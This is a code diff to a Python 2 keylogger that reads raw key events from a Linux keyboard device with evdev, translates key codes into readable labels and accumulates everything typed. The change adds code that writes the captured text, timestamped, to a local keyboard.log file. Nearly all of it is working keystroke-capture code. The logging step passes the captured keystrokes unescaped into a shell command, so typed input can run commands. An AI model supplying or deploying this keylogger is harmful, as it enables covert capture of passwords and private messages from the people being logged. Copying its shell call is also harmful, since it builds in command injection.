@@ -2,11 +2,12 @@
 # coding: utf8
 
 import string
+import os
 import sys
 from evdev import InputDevice
 from select import select
 
-
+fichier_log='./keyboard.log'
 
 try:
 	userKeyboardDevice = sys.argv[1]
@@ -20,13 +21,9 @@ dev = InputDevice(userKeyboardDevice)
 
 if userKeyboardDevice != "" :
 	dev=InputDevice(userKeyboardDevice)
-print "--------------------KEYBOARD DEVICE--------------------------"
-print "[+] "+userKeyboardDevice+"\n"
-print "--------------------{KEYBOARD LOGGING STARTED ON DEVICE: "+userKeyboardDevice+"}--------------------------"
-
 def keyspe(touchecode):
 	switcher={
-	    1: "Echap",
+	    1: "Escape",
 	    3: "é",
 	    4: "\"",
 	    5: "'",
@@ -40,15 +37,15 @@ def keyspe(touchecode):
 	    15: "Tab",
 	    26: "¨",
 	    27: "$",
-	    28: "ENTREE",
+	    28: "ENTER",
 	    29: "Ctrl Gauche",
 	    40: "Ù",
 	    41: "²",
-	    42: "Shift Gauche",
+	    42: "Shift LEFT",
 	    43: "*",
-	    54: "Shift Droit",
-	    56: "Alt Gauche",
-	    57: "Espace",
+	    54: "Shift RIGHT",
+	    56: "Alt LEFT",
+	    57: "Space",
 	    58: "Verr. Num.",
 	    59: "F1",
 	    60: "F2",
@@ -62,20 +59,25 @@ def keyspe(touchecode):
 	    68: "F10",
 	    69: "F11",
 	    70: "F12",
-	    99: "Impr. Ecran",
-	    103: "Fleche HAUT",
-	    104: "Page HAUT",
-	    105: "Fleche DROITE",
-	    106: "Fleche GAUCHE",
-	    108: "Fleche BAS",
-	    109: "Page BAS",
+	    99: "Print Scrreen",
+	    103: "Arrow UP",
+	    104: "Page UP",
+	    105: "Arrow RIGHT",
+	    106: "Arrow LEFT",
+	    108: "Arrow DOWN",
+	    109: "Page DOWN",
 	    110: "Insert",
-	    111: "Suppr.",
+	    111: "Del.",
 	    999: "XD"
 	}
 	return switcher.get(touchecode,0)
 fullphrase=''
 touchecode_previous=-1
+
+os.system('clear');
+print "--------------------{KEYBOARD LOGGING STARTED ON DEVICE: "+userKeyboardDevice+"}--------------------------"
+print "CTRL+C : Quit"
+print "----------------------------------------------------------------------------------------------------------"
 try:
 	while True:
 	   r,w,x = select([dev], [], [])
@@ -89,13 +91,27 @@ try:
 				touche=" ["+ks+"] ";
 
 			if ( touchecode_previous == 42 ) or ( touchecode_previous == 54):
-				touche=" [MAJ "+touche+"] ";
+				touche=" [SHIFT "+touche+"] ";
+			#try:
+			#	os.system('clear');
+			#except:
+			#	error="true"
+			#print "--------------------{KEYBOARD LOGGING STARTED ON DEVICE: "+userKeyboardDevice+"}--------------------------"
 
-		        print( '\n[+] CODE TOUCHE:'+ touchecode +' => TOUCHE: "'+touche+'"(ASCII:'+touchecodeascii+') '+str(touchecode_previous)+''), #<'+str(ks)+'>
-			fullphrase=fullphrase+touche+""
+		        #print( '\n[+] CODE TOUCHE:'+ touchecode +' => TOUCHE: "'+touche+'"(ASCII:'+touchecodeascii+') '+str(touchecode_previous)+'') #<'+str(ks)+'>
+			print("\n[+] Key: "+touche+"") #<'+str(ks)+'>
+			fullphrase=str(fullphrase+touche)
 			touchecode_previous=int(touchecode);
-			print( '!')
+			#print("[+] FULL SENTENSE:\n"+fullphrase+"");
 except:
-	 print( '\n[+] Recorded sentense:\n'+fullphrase);
+	print "----------------------------------------------------------------------------------------------------------"
+	print( '\n[+] Recorded sentense:\n'+fullphrase);
+	try:
+		os.system('/bin/echo -e $(/bin/date "+%s")\'\t'+fullphrase+'\' >> '+fichier_log+'');
+		print( '\n[+] saved in :'+fichier_log);
+	except:
+		print( '\n[X] Impossible to save in :'+fichier_log);
 
+
+print "----------------------------------------------------------------------------------------------------------"
 print( '\n[+] Bye!')
